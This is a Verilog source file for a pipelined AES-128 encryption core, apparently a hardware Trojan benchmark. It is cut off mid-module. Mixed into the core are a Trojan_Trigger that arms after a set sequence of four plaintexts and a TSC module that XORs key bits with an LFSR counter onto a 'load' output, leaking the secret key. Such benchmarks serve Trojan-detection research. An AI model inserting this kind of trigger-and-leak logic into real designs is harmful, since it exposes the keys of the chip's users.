/*
 * Copyright 2012, Homer Hsing <homer.hsing@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http:
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

module aes_128(clk, rst, state, key, out);
    input          clk;
    input          rst;
    input  [127:0] state, key;
    output [127:0] out;
    reg    [127:0] s0, k0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
    wire   [127:0] unused_a10_out;

    always @ (posedge clk)
      begin
        s0 <= state ^ key;
        k0 <= key;
      end

    expand_key_128
        a1 (clk, k0, k1, k0b, 8'h1),
        a2 (clk, k1, k2, k1b, 8'h2),
        a3 (clk, k2, k3, k2b, 8'h4),
        a4 (clk, k3, k4, k3b, 8'h8),
        a5 (clk, k4, k5, k4b, 8'h10),
        a6 (clk, k5, k6, k5b, 8'h20),
        a7 (clk, k6, k7, k6b, 8'h40),
        a8 (clk, k7, k8, k7b, 8'h80),
        a9 (clk, k8, k9, k8b, 8'h1b),
       a10 (clk, k9, unused_a10_out, k9b, 8'h36);

    one_round
        r1 (clk, s0, k0b, s1),
        r2 (clk, s1, k1b, s2),
        r3 (clk, s2, k2b, s3),
        r4 (clk, s3, k3b, s4),
        r5 (clk, s4, k4b, s5),
        r6 (clk, s5, k5b, s6),
        r7 (clk, s6, k6b, s7),
        r8 (clk, s7, k7b, s8),
        r9 (clk, s8, k8b, s9);

    final_round
        rf (clk, s9, k9b, out);
endmodule

module expand_key_128(clk, in, out_1, out_2, rcon);
    input              clk;
    input      [127:0] in;
    input      [7:0]   rcon;
    output reg [127:0] out_1;
    output     [127:0] out_2;
    wire       [31:0]  k0, k1, k2, k3,
                       v0, v1, v2, v3;
    reg        [31:0]  k0a, k1a, k2a, k3a;
    wire       [31:0]  k0b, k1b, k2b, k3b, k4a;
    wire       [31:0]  s4_0_in;

    assign {k0, k1, k2, k3} = in;
    
    assign v0 = {k0[31:24] ^ rcon, k0[23:0]};
    assign v1 = v0 ^ k1;
    assign v2 = v1 ^ k2;
    assign v3 = v2 ^ k3;

    always @ (posedge clk)
        {k0a, k1a, k2a, k3a} <= {v0, v1, v2, v3};

    assign s4_0_in = {k3[23:0], k3[31:24]};

    S4
        S4_0 (clk, s4_0_in, k4a);

    assign k0b = k0a ^ k4a;
    assign k1b = k1a ^ k4a;
    assign k2b = k2a ^ k4a;
    assign k3b = k3a ^ k4a;

    always @ (posedge clk)
        out_1 <= {k0b, k1b, k2b, k3b};

    assign out_2 = {k0b, k1b, k2b, k3b};
endmodule



module lfsr_counter (
	input rst, clk, Tj_Trig,
   output [19:0] lfsr
	);

	reg [19:0] lfsr_stream;
	wire d0; 
	
	
	assign lfsr = lfsr_stream; 
	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 

	always @(posedge clk)
		if (rst == 1) begin
			lfsr_stream <= "10011001100110011001";
		end else begin
			if (Tj_Trig == 1) begin
				lfsr_stream <= {d0,lfsr_stream[19:1]}; 
			end	
		end
		
endmodule
/*
 * Copyright 2012, Homer Hsing <homer.hsing@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http:
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/* one AES round for every two clock cycles */
module one_round (clk, state_in, key, state_out);
    input              clk;
    input      [127:0] state_in, key;
    output reg [127:0] state_out;
    wire       [31:0]  s0,  s1,  s2,  s3,
                       z0,  z1,  z2,  z3,
                       p00, p01, p02, p03,
                       p10, p11, p12, p13,
                       p20, p21, p22, p23,
                       p30, p31, p32, p33,
                       k0,  k1,  k2,  k3;

    assign {k0, k1, k2, k3} = key;

    assign {s0, s1, s2, s3} = state_in;

    table_lookup
        t0 (clk, s0, p00, p01, p02, p03),
        t1 (clk, s1, p10, p11, p12, p13),
        t2 (clk, s2, p20, p21, p22, p23),
        t3 (clk, s3, p30, p31, p32, p33);

    assign z0 = p00 ^ p11 ^ p22 ^ p33 ^ k0;
    assign z1 = p03 ^ p10 ^ p21 ^ p32 ^ k1;
    assign z2 = p02 ^ p13 ^ p20 ^ p31 ^ k2;
    assign z3 = p01 ^ p12 ^ p23 ^ p30 ^ k3;

    always @ (posedge clk)
        state_out <= {z0, z1, z2, z3};
endmodule

/* AES final round for every two clock cycles */
module final_round (clk, state_in, key_in, state_out);
    input              clk;
    input      [127:0] state_in;
    input      [127:0] key_in;
    output reg [127:0] state_out;
    wire [31:0] s0,  s1,  s2,  s3,
                z0,  z1,  z2,  z3,
                k0,  k1,  k2,  k3;
    wire [7:0]  p00, p01, p02, p03,
                p10, p11, p12, p13,
                p20, p21, p22, p23,
                p30, p31, p32, p33;
    wire [31:0] s4_1_out, s4_2_out, s4_3_out, s4_4_out;
    
    assign {k0, k1, k2, k3} = key_in;
    
    assign {s0, s1, s2, s3} = state_in;

    assign {p00, p01, p02, p03} = s4_1_out;
    assign {p10, p11, p12, p13} = s4_2_out;
    assign {p20, p21, p22, p23} = s4_3_out;
    assign {p30, p31, p32, p33} = s4_4_out;
    S4
        S4_1 (clk, s0, s4_1_out),
        S4_2 (clk, s1, s4_2_out),
        S4_3 (clk, s2, s4_3_out),
        S4_4 (clk, s3, s4_4_out);

    assign z0 = {p00, p11, p22, p33} ^ k0;
    assign z1 = {p10, p21, p32, p03} ^ k1;
    assign z2 = {p20, p31, p02, p13} ^ k2;
    assign z3 = {p30, p01, p12, p23} ^ k3;

    always @ (posedge clk)
        state_out <= {z0, z1, z2, z3};
endmodule


/*
 * Copyright 2012, Homer Hsing <homer.hsing@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http:
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

module table_lookup (clk, state, p0, p1, p2, p3);
    input clk;
    input [31:0] state;
    output [31:0] p0, p1, p2, p3;
    wire [7:0] b0, b1, b2, b3;
    wire [31:0] t0_out, t1_out, t2_out, t3_out;
    
    assign {b0, b1, b2, b3} = state;
    assign p0 = {t0_out[7:0], t0_out[31:8]};
    assign p1 = {t1_out[15:0], t1_out[31:16]};
    assign p2 = {t2_out[23:0], t2_out[31:24]};
    assign p3 = t3_out;
    T
        t0 (clk, b0, t0_out),
        t1 (clk, b1, t1_out),
        t2 (clk, b2, t2_out),
        t3 (clk, b3, t3_out);
endmodule

/* substitue four bytes in a word */
module S4 (clk, in, out);
    input clk;
    input [31:0] in;
    output [31:0] out;
    
    wire [7:0] s_0_out, s_1_out, s_2_out, s_3_out;
    
    assign out[31:24] = s_0_out;
    assign out[23:16] = s_1_out;
    assign out[15:8]  = s_2_out;
    assign out[7:0]   = s_3_out;
    
    S
        S_0 (clk, in[31:24], s_0_out),
        S_1 (clk, in[23:16], s_1_out),
        S_2 (clk, in[15:8],  s_2_out),
        S_3 (clk, in[7:0],   s_3_out);
endmodule

/* S_box, S_box, S_box*(x+1), S_box*x */
module T (clk, in, out);
    input         clk;
    input  [7:0]  in;
    output [31:0] out;
    
    wire [7:0] s0_out, s4_out;
    
    assign out[31:24] = s0_out;
    assign out[23:16] = s0_out;
    assign out[7:0]   = s4_out;
    assign out[15:8]  = s0_out ^ s4_out;
    
    S
        s0 (clk, in, s0_out);
    xS
        s4 (clk, in, s4_out);
endmodule

/* S box - using lookup table to avoid Pyverilog recursion */
module S (clk, in, out);
    input clk;
    input [7:0] in;
    output reg [7:0] out;

    
    reg [7:0] s_table [0:255];
    
    initial begin
        s_table[8'h00] = 8'h63;
        s_table[8'h01] = 8'h7c;
        s_table[8'h02] = 8'h77;
        s_table[8'h03] = 8'h7b;
        s_table[8'h04] = 8'hf2;
        s_table[8'h05] = 8'h6b;
        s_table[8'h06] = 8'h6f;
        s_table[8'h07] = 8'hc5;
        s_table[8'h08] = 8'h30;
        s_table[8'h09] = 8'h01;
        s_table[8'h0a] = 8'h67;
        s_table[8'h0b] = 8'h2b;
        s_table[8'h0c] = 8'hfe;
        s_table[8'h0d] = 8'hd7;
        s_table[8'h0e] = 8'hab;
        s_table[8'h0f] = 8'h76;
        s_table[8'h10] = 8'hca;
        s_table[8'h11] = 8'h82;
        s_table[8'h12] = 8'hc9;
        s_table[8'h13] = 8'h7d;
        s_table[8'h14] = 8'hfa;
        s_table[8'h15] = 8'h59;
        s_table[8'h16] = 8'h47;
        s_table[8'h17] = 8'hf0;
        s_table[8'h18] = 8'had;
        s_table[8'h19] = 8'hd4;
        s_table[8'h1a] = 8'ha2;
        s_table[8'h1b] = 8'haf;
        s_table[8'h1c] = 8'h9c;
        s_table[8'h1d] = 8'ha4;
        s_table[8'h1e] = 8'h72;
        s_table[8'h1f] = 8'hc0;
        s_table[8'h20] = 8'hb7;
        s_table[8'h21] = 8'hfd;
        s_table[8'h22] = 8'h93;
        s_table[8'h23] = 8'h26;
        s_table[8'h24] = 8'h36;
        s_table[8'h25] = 8'h3f;
        s_table[8'h26] = 8'hf7;
        s_table[8'h27] = 8'hcc;
        s_table[8'h28] = 8'h34;
        s_table[8'h29] = 8'ha5;
        s_table[8'h2a] = 8'he5;
        s_table[8'h2b] = 8'hf1;
        s_table[8'h2c] = 8'h71;
        s_table[8'h2d] = 8'hd8;
        s_table[8'h2e] = 8'h31;
        s_table[8'h2f] = 8'h15;
        s_table[8'h30] = 8'h04;
        s_table[8'h31] = 8'hc7;
        s_table[8'h32] = 8'h23;
        s_table[8'h33] = 8'hc3;
        s_table[8'h34] = 8'h18;
        s_table[8'h35] = 8'h96;
        s_table[8'h36] = 8'h05;
        s_table[8'h37] = 8'h9a;
        s_table[8'h38] = 8'h07;
        s_table[8'h39] = 8'h12;
        s_table[8'h3a] = 8'h80;
        s_table[8'h3b] = 8'he2;
        s_table[8'h3c] = 8'heb;
        s_table[8'h3d] = 8'h27;
        s_table[8'h3e] = 8'hb2;
        s_table[8'h3f] = 8'h75;
        s_table[8'h40] = 8'h09;
        s_table[8'h41] = 8'h83;
        s_table[8'h42] = 8'h2c;
        s_table[8'h43] = 8'h1a;
        s_table[8'h44] = 8'h1b;
        s_table[8'h45] = 8'h6e;
        s_table[8'h46] = 8'h5a;
        s_table[8'h47] = 8'ha0;
        s_table[8'h48] = 8'h52;
        s_table[8'h49] = 8'h3b;
        s_table[8'h4a] = 8'hd6;
        s_table[8'h4b] = 8'hb3;
        s_table[8'h4c] = 8'h29;
        s_table[8'h4d] = 8'he3;
        s_table[8'h4e] = 8'h2f;
        s_table[8'h4f] = 8'h84;
        s_table[8'h50] = 8'h53;
        s_table[8'h51] = 8'hd1;
        s_table[8'h52] = 8'h00;
        s_table[8'h53] = 8'hed;
        s_table[8'h54] = 8'h20;
        s_table[8'h55] = 8'hfc;
        s_table[8'h56] = 8'hb1;
        s_table[8'h57] = 8'h5b;
        s_table[8'h58] = 8'h6a;
        s_table[8'h59] = 8'hcb;
        s_table[8'h5a] = 8'hbe;
        s_table[8'h5b] = 8'h39;
        s_table[8'h5c] = 8'h4a;
        s_table[8'h5d] = 8'h4c;
        s_table[8'h5e] = 8'h58;
        s_table[8'h5f] = 8'hcf;
        s_table[8'h60] = 8'hd0;
        s_table[8'h61] = 8'hef;
        s_table[8'h62] = 8'haa;
        s_table[8'h63] = 8'hfb;
        s_table[8'h64] = 8'h43;
        s_table[8'h65] = 8'h4d;
        s_table[8'h66] = 8'h33;
        s_table[8'h67] = 8'h85;
        s_table[8'h68] = 8'h45;
        s_table[8'h69] = 8'hf9;
        s_table[8'h6a] = 8'h02;
        s_table[8'h6b] = 8'h7f;
        s_table[8'h6c] = 8'h50;
        s_table[8'h6d] = 8'h3c;
        s_table[8'h6e] = 8'h9f;
        s_table[8'h6f] = 8'ha8;
        s_table[8'h70] = 8'h51;
        s_table[8'h71] = 8'ha3;
        s_table[8'h72] = 8'h40;
        s_table[8'h73] = 8'h8f;
        s_table[8'h74] = 8'h92;
        s_table[8'h75] = 8'h9d;
        s_table[8'h76] = 8'h38;
        s_table[8'h77] = 8'hf5;
        s_table[8'h78] = 8'hbc;
        s_table[8'h79] = 8'hb6;
        s_table[8'h7a] = 8'hda;
        s_table[8'h7b] = 8'h21;
        s_table[8'h7c] = 8'h10;
        s_table[8'h7d] = 8'hff;
        s_table[8'h7e] = 8'hf3;
        s_table[8'h7f] = 8'hd2;
        s_table[8'h80] = 8'hcd;
        s_table[8'h81] = 8'h0c;
        s_table[8'h82] = 8'h13;
        s_table[8'h83] = 8'hec;
        s_table[8'h84] = 8'h5f;
        s_table[8'h85] = 8'h97;
        s_table[8'h86] = 8'h44;
        s_table[8'h87] = 8'h17;
        s_table[8'h88] = 8'hc4;
        s_table[8'h89] = 8'ha7;
        s_table[8'h8a] = 8'h7e;
        s_table[8'h8b] = 8'h3d;
        s_table[8'h8c] = 8'h64;
        s_table[8'h8d] = 8'h5d;
        s_table[8'h8e] = 8'h19;
        s_table[8'h8f] = 8'h73;
        s_table[8'h90] = 8'h60;
        s_table[8'h91] = 8'h81;
        s_table[8'h92] = 8'h4f;
        s_table[8'h93] = 8'hdc;
        s_table[8'h94] = 8'h22;
        s_table[8'h95] = 8'h2a;
        s_table[8'h96] = 8'h90;
        s_table[8'h97] = 8'h88;
        s_table[8'h98] = 8'h46;
        s_table[8'h99] = 8'hee;
        s_table[8'h9a] = 8'hb8;
        s_table[8'h9b] = 8'h14;
        s_table[8'h9c] = 8'hde;
        s_table[8'h9d] = 8'h5e;
        s_table[8'h9e] = 8'h0b;
        s_table[8'h9f] = 8'hdb;
        s_table[8'ha0] = 8'he0;
        s_table[8'ha1] = 8'h32;
        s_table[8'ha2] = 8'h3a;
        s_table[8'ha3] = 8'h0a;
        s_table[8'ha4] = 8'h49;
        s_table[8'ha5] = 8'h06;
        s_table[8'ha6] = 8'h24;
        s_table[8'ha7] = 8'h5c;
        s_table[8'ha8] = 8'hc2;
        s_table[8'ha9] = 8'hd3;
        s_table[8'haa] = 8'hac;
        s_table[8'hab] = 8'h62;
        s_table[8'hac] = 8'h91;
        s_table[8'had] = 8'h95;
        s_table[8'hae] = 8'he4;
        s_table[8'haf] = 8'h79;
        s_table[8'hb0] = 8'he7;
        s_table[8'hb1] = 8'hc8;
        s_table[8'hb2] = 8'h37;
        s_table[8'hb3] = 8'h6d;
        s_table[8'hb4] = 8'h8d;
        s_table[8'hb5] = 8'hd5;
        s_table[8'hb6] = 8'h4e;
        s_table[8'hb7] = 8'ha9;
        s_table[8'hb8] = 8'h6c;
        s_table[8'hb9] = 8'h56;
        s_table[8'hba] = 8'hf4;
        s_table[8'hbb] = 8'hea;
        s_table[8'hbc] = 8'h65;
        s_table[8'hbd] = 8'h7a;
        s_table[8'hbe] = 8'hae;
        s_table[8'hbf] = 8'h08;
        s_table[8'hc0] = 8'hba;
        s_table[8'hc1] = 8'h78;
        s_table[8'hc2] = 8'h25;
        s_table[8'hc3] = 8'h2e;
        s_table[8'hc4] = 8'h1c;
        s_table[8'hc5] = 8'ha6;
        s_table[8'hc6] = 8'hb4;
        s_table[8'hc7] = 8'hc6;
        s_table[8'hc8] = 8'he8;
        s_table[8'hc9] = 8'hdd;
        s_table[8'hca] = 8'h74;
        s_table[8'hcb] = 8'h1f;
        s_table[8'hcc] = 8'h4b;
        s_table[8'hcd] = 8'hbd;
        s_table[8'hce] = 8'h8b;
        s_table[8'hcf] = 8'h8a;
        s_table[8'hd0] = 8'h70;
        s_table[8'hd1] = 8'h3e;
        s_table[8'hd2] = 8'hb5;
        s_table[8'hd3] = 8'h66;
        s_table[8'hd4] = 8'h48;
        s_table[8'hd5] = 8'h03;
        s_table[8'hd6] = 8'hf6;
        s_table[8'hd7] = 8'h0e;
        s_table[8'hd8] = 8'h61;
        s_table[8'hd9] = 8'h35;
        s_table[8'hda] = 8'h57;
        s_table[8'hdb] = 8'hb9;
        s_table[8'hdc] = 8'h86;
        s_table[8'hdd] = 8'hc1;
        s_table[8'hde] = 8'h1d;
        s_table[8'hdf] = 8'h9e;
        s_table[8'he0] = 8'he1;
        s_table[8'he1] = 8'hf8;
        s_table[8'he2] = 8'h98;
        s_table[8'he3] = 8'h11;
        s_table[8'he4] = 8'h69;
        s_table[8'he5] = 8'hd9;
        s_table[8'he6] = 8'h8e;
        s_table[8'he7] = 8'h94;
        s_table[8'he8] = 8'h9b;
        s_table[8'he9] = 8'h1e;
        s_table[8'hea] = 8'h87;
        s_table[8'heb] = 8'he9;
        s_table[8'hec] = 8'hce;
        s_table[8'hed] = 8'h55;
        s_table[8'hee] = 8'h28;
        s_table[8'hef] = 8'hdf;
        s_table[8'hf0] = 8'h8c;
        s_table[8'hf1] = 8'ha1;
        s_table[8'hf2] = 8'h89;
        s_table[8'hf3] = 8'h0d;
        s_table[8'hf4] = 8'hbf;
        s_table[8'hf5] = 8'he6;
        s_table[8'hf6] = 8'h42;
        s_table[8'hf7] = 8'h68;
        s_table[8'hf8] = 8'h41;
        s_table[8'hf9] = 8'h99;
        s_table[8'hfa] = 8'h2d;
        s_table[8'hfb] = 8'h0f;
        s_table[8'hfc] = 8'hb0;
        s_table[8'hfd] = 8'h54;
        s_table[8'hfe] = 8'hbb;
        s_table[8'hff] = 8'h16;
    end

    always @ (posedge clk)
        out <= s_table[in];
endmodule

/* xS box - using lookup table to avoid Pyverilog recursion */
module xS (clk, in, out);
    input clk;
    input [7:0] in;
    output reg [7:0] out;

    
    reg [7:0] xs_table [0:255];
    
    initial begin
        xs_table[8'h00] = 8'hc6;
        xs_table[8'h01] = 8'hf8;
        xs_table[8'h02] = 8'hee;
        xs_table[8'h03] = 8'hf6;
        xs_table[8'h04] = 8'hff;
        xs_table[8'h05] = 8'hd6;
        xs_table[8'h06] = 8'hde;
        xs_table[8'h07] = 8'h91;
        xs_table[8'h08] = 8'h60;
        xs_table[8'h09] = 8'h02;
        xs_table[8'h0a] = 8'hce;
        xs_table[8'h0b] = 8'h56;
        xs_table[8'h0c] = 8'he7;
        xs_table[8'h0d] = 8'hb5;
        xs_table[8'h0e] = 8'h4d;
        xs_table[8'h0f] = 8'hec;
        xs_table[8'h10] = 8'h8f;
        xs_table[8'h11] = 8'h1f;
        xs_table[8'h12] = 8'h89;
        xs_table[8'h13] = 8'hfa;
        xs_table[8'h14] = 8'hef;
        xs_table[8'h15] = 8'hb2;
        xs_table[8'h16] = 8'h8e;
        xs_table[8'h17] = 8'hfb;
        xs_table[8'h18] = 8'h41;
        xs_table[8'h19] = 8'hb3;
        xs_table[8'h1a] = 8'h5f;
        xs_table[8'h1b] = 8'h45;
        xs_table[8'h1c] = 8'h23;
        xs_table[8'h1d] = 8'h53;
        xs_table[8'h1e] = 8'he4;
        xs_table[8'h1f] = 8'h9b;
        xs_table[8'h20] = 8'h75;
        xs_table[8'h21] = 8'he1;
        xs_table[8'h22] = 8'h3d;
        xs_table[8'h23] = 8'h4c;
        xs_table[8'h24] = 8'h6c;
        xs_table[8'h25] = 8'h7e;
        xs_table[8'h26] = 8'hf5;
        xs_table[8'h27] = 8'h83;
        xs_table[8'h28] = 8'h68;
        xs_table[8'h29] = 8'h51;
        xs_table[8'h2a] = 8'hd1;
        xs_table[8'h2b] = 8'hf9;
        xs_table[8'h2c] = 8'he2;
        xs_table[8'h2d] = 8'hab;
        xs_table[8'h2e] = 8'h62;
        xs_table[8'h2f] = 8'h2a;
        xs_table[8'h30] = 8'h08;
        xs_table[8'h31] = 8'h95;
        xs_table[8'h32] = 8'h46;
        xs_table[8'h33] = 8'h9d;
        xs_table[8'h34] = 8'h30;
        xs_table[8'h35] = 8'h37;
        xs_table[8'h36] = 8'h0a;
        xs_table[8'h37] = 8'h2f;
        xs_table[8'h38] = 8'h0e;
        xs_table[8'h39] = 8'h24;
        xs_table[8'h3a] = 8'h1b;
        xs_table[8'h3b] = 8'hdf;
        xs_table[8'h3c] = 8'hcd;
        xs_table[8'h3d] = 8'h4e;
        xs_table[8'h3e] = 8'h7f;
        xs_table[8'h3f] = 8'hea;
        xs_table[8'h40] = 8'h12;
        xs_table[8'h41] = 8'h1d;
        xs_table[8'h42] = 8'h58;
        xs_table[8'h43] = 8'h34;
        xs_table[8'h44] = 8'h36;
        xs_table[8'h45] = 8'hdc;
        xs_table[8'h46] = 8'hb4;
        xs_table[8'h47] = 8'h5b;
        xs_table[8'h48] = 8'ha4;
        xs_table[8'h49] = 8'h76;
        xs_table[8'h4a] = 8'hb7;
        xs_table[8'h4b] = 8'h7d;
        xs_table[8'h4c] = 8'h52;
        xs_table[8'h4d] = 8'hdd;
        xs_table[8'h4e] = 8'h5e;
        xs_table[8'h4f] = 8'h13;
        xs_table[8'h50] = 8'ha6;
        xs_table[8'h51] = 8'hb9;
        xs_table[8'h52] = 8'h00;
        xs_table[8'h53] = 8'hc1;
        xs_table[8'h54] = 8'h40;
        xs_table[8'h55] = 8'he3;
        xs_table[8'h56] = 8'h79;
        xs_table[8'h57] = 8'hb6;
        xs_table[8'h58] = 8'hd4;
        xs_table[8'h59] = 8'h8d;
        xs_table[8'h5a] = 8'h67;
        xs_table[8'h5b] = 8'h72;
        xs_table[8'h5c] = 8'h94;
        xs_table[8'h5d] = 8'h98;
        xs_table[8'h5e] = 8'hb0;
        xs_table[8'h5f] = 8'h85;
        xs_table[8'h60] = 8'hbb;
        xs_table[8'h61] = 8'hc5;
        xs_table[8'h62] = 8'h4f;
        xs_table[8'h63] = 8'hed;
        xs_table[8'h64] = 8'h86;
        xs_table[8'h65] = 8'h9a;
        xs_table[8'h66] = 8'h66;
        xs_table[8'h67] = 8'h11;
        xs_table[8'h68] = 8'h8a;
        xs_table[8'h69] = 8'he9;
        xs_table[8'h6a] = 8'h04;
        xs_table[8'h6b] = 8'hfe;
        xs_table[8'h6c] = 8'ha0;
        xs_table[8'h6d] = 8'h78;
        xs_table[8'h6e] = 8'h25;
        xs_table[8'h6f] = 8'h4b;
        xs_table[8'h70] = 8'ha2;
        xs_table[8'h71] = 8'h5d;
        xs_table[8'h72] = 8'h80;
        xs_table[8'h73] = 8'h05;
        xs_table[8'h74] = 8'h3f;
        xs_table[8'h75] = 8'h21;
        xs_table[8'h76] = 8'h70;
        xs_table[8'h77] = 8'hf1;
        xs_table[8'h78] = 8'h63;
        xs_table[8'h79] = 8'h77;
        xs_table[8'h7a] = 8'haf;
        xs_table[8'h7b] = 8'h42;
        xs_table[8'h7c] = 8'h20;
        xs_table[8'h7d] = 8'he5;
        xs_table[8'h7e] = 8'hfd;
        xs_table[8'h7f] = 8'hbf;
        xs_table[8'h80] = 8'h81;
        xs_table[8'h81] = 8'h18;
        xs_table[8'h82] = 8'h26;
        xs_table[8'h83] = 8'hc3;
        xs_table[8'h84] = 8'hbe;
        xs_table[8'h85] = 8'h35;
        xs_table[8'h86] = 8'h88;
        xs_table[8'h87] = 8'h2e;
        xs_table[8'h88] = 8'h93;
        xs_table[8'h89] = 8'h55;
        xs_table[8'h8a] = 8'hfc;
        xs_table[8'h8b] = 8'h7a;
        xs_table[8'h8c] = 8'hc8;
        xs_table[8'h8d] = 8'hba;
        xs_table[8'h8e] = 8'h32;
        xs_table[8'h8f] = 8'he6;
        xs_table[8'h90] = 8'hc0;
        xs_table[8'h91] = 8'h19;
        xs_table[8'h92] = 8'h9e;
        xs_table[8'h93] = 8'ha3;
        xs_table[8'h94] = 8'h44;
        xs_table[8'h95] = 8'h54;
        xs_table[8'h96] = 8'h3b;
        xs_table[8'h97] = 8'h0b;
        xs_table[8'h98] = 8'h8c;
        xs_table[8'h99] = 8'hc7;
        xs_table[8'h9a] = 8'h6b;
        xs_table[8'h9b] = 8'h28;
        xs_table[8'h9c] = 8'ha7;
        xs_table[8'h9d] = 8'hbc;
        xs_table[8'h9e] = 8'h16;
        xs_table[8'h9f] = 8'had;
        xs_table[8'ha0] = 8'hdb;
        xs_table[8'ha1] = 8'h64;
        xs_table[8'ha2] = 8'h74;
        xs_table[8'ha3] = 8'h14;
        xs_table[8'ha4] = 8'h92;
        xs_table[8'ha5] = 8'h0c;
        xs_table[8'ha6] = 8'h48;
        xs_table[8'ha7] = 8'hb8;
        xs_table[8'ha8] = 8'h9f;
        xs_table[8'ha9] = 8'hbd;
        xs_table[8'haa] = 8'h43;
        xs_table[8'hab] = 8'hc4;
        xs_table[8'hac] = 8'h39;
        xs_table[8'had] = 8'h31;
        xs_table[8'hae] = 8'hd3;
        xs_table[8'haf] = 8'hf2;
        xs_table[8'hb0] = 8'hd5;
        xs_table[8'hb1] = 8'h8b;
        xs_table[8'hb2] = 8'h6e;
        xs_table[8'hb3] = 8'hda;
        xs_table[8'hb4] = 8'h01;
        xs_table[8'hb5] = 8'hb1;
        xs_table[8'hb6] = 8'h9c;
        xs_table[8'hb7] = 8'h49;
        xs_table[8'hb8] = 8'hd8;
        xs_table[8'hb9] = 8'hac;
        xs_table[8'hba] = 8'hf3;
        xs_table[8'hbb] = 8'hcf;
        xs_table[8'hbc] = 8'hca;
        xs_table[8'hbd] = 8'hf4;
        xs_table[8'hbe] = 8'h47;
        xs_table[8'hbf] = 8'h10;
        xs_table[8'hc0] = 8'h6f;
        xs_table[8'hc1] = 8'hf0;
        xs_table[8'hc2] = 8'h4a;
        xs_table[8'hc3] = 8'h5c;
        xs_table[8'hc4] = 8'h38;
        xs_table[8'hc5] = 8'h57;
        xs_table[8'hc6] = 8'h73;
        xs_table[8'hc7] = 8'h97;
        xs_table[8'hc8] = 8'hcb;
        xs_table[8'hc9] = 8'ha1;
        xs_table[8'hca] = 8'he8;
        xs_table[8'hcb] = 8'h3e;
        xs_table[8'hcc] = 8'h96;
        xs_table[8'hcd] = 8'h61;
        xs_table[8'hce] = 8'h0d;
        xs_table[8'hcf] = 8'h0f;
        xs_table[8'hd0] = 8'he0;
        xs_table[8'hd1] = 8'h7c;
        xs_table[8'hd2] = 8'h71;
        xs_table[8'hd3] = 8'hcc;
        xs_table[8'hd4] = 8'h90;
        xs_table[8'hd5] = 8'h06;
        xs_table[8'hd6] = 8'hf7;
        xs_table[8'hd7] = 8'h1c;
        xs_table[8'hd8] = 8'hc2;
        xs_table[8'hd9] = 8'h6a;
        xs_table[8'hda] = 8'hae;
        xs_table[8'hdb] = 8'h69;
        xs_table[8'hdc] = 8'h17;
        xs_table[8'hdd] = 8'h99;
        xs_table[8'hde] = 8'h3a;
        xs_table[8'hdf] = 8'h27;
        xs_table[8'he0] = 8'hd9;
        xs_table[8'he1] = 8'heb;
        xs_table[8'he2] = 8'h2b;
        xs_table[8'he3] = 8'h22;
        xs_table[8'he4] = 8'hd2;
        xs_table[8'he5] = 8'ha9;
        xs_table[8'he6] = 8'h07;
        xs_table[8'he7] = 8'h33;
        xs_table[8'he8] = 8'h2d;
        xs_table[8'he9] = 8'h3c;
        xs_table[8'hea] = 8'h15;
        xs_table[8'heb] = 8'hc9;
        xs_table[8'hec] = 8'h87;
        xs_table[8'hed] = 8'haa;
        xs_table[8'hee] = 8'h50;
        xs_table[8'hef] = 8'ha5;
        xs_table[8'hf0] = 8'h03;
        xs_table[8'hf1] = 8'h59;
        xs_table[8'hf2] = 8'h09;
        xs_table[8'hf3] = 8'h1a;
        xs_table[8'hf4] = 8'h65;
        xs_table[8'hf5] = 8'hd7;
        xs_table[8'hf6] = 8'h84;
        xs_table[8'hf7] = 8'hd0;
        xs_table[8'hf8] = 8'h82;
        xs_table[8'hf9] = 8'h29;
        xs_table[8'hfa] = 8'h5a;
        xs_table[8'hfb] = 8'h1e;
        xs_table[8'hfc] = 8'h7b;
        xs_table[8'hfd] = 8'ha8;
        xs_table[8'hfe] = 8'h6d;
        xs_table[8'hff] = 8'h2c;
    end

    always @ (posedge clk)
        out <= xs_table[in];
endmodule

`timescale 1ns / 1ps
module Trojan_Trigger(
    input rst,
    input [127:0] state,
    output Tj_Trig
    );

	reg Tj_Trig;
	reg State0, State1, State2, State3;
	
	always @(rst, state)
	begin
		if (rst == 1) begin
			State0 <= 0;
			State1 <= 0;
			State2 <= 0;
			State3 <= 0; 
		end else if (state == 128'h3243f6a8_885a308d_313198a2_e0370734) begin
			State0 <= 1;
		end else if ((state == 128'h00112233_44556677_8899aabb_ccddeeff) && (State0 == 1)) begin
			State1 <= 1;
		end else if ((state == 128'h0) && (State1 == 1)) begin
			State2 <= 1;
		end else if ((state == 128'h1) && (State2 == 1)) begin
			State3 <= 1;
		end
	end

	always @(State0, State1, State2, State3)
	begin
		Tj_Trig <= State0 & State1 & State2 & State3;
	end

endmodule

`timescale 1ns / 1ps
module TSC(
    input rst,
    input clk,
	 input Tj_Trig, 
    input [127:0] key,
	 output [63:0] load
    );

	reg [63:0] load;
	wire [19: 0] counter;
	
	lfsr_counter lfsr (rst, clk, Tj_Trig, counter);
	always @ (posedge clk)
		begin
			if (rst == 1) begin
				load <= 0;
			end else begin	
				load[0] <= key[0] ^ counter[0];	
				load[1] <= key[0] ^ counter[0];	
				load[2] <= key[0] ^ counter[0];	
				load[3] <= key[0] ^ counter[0];	
				load[4] <= key[0] ^ counter[0];	
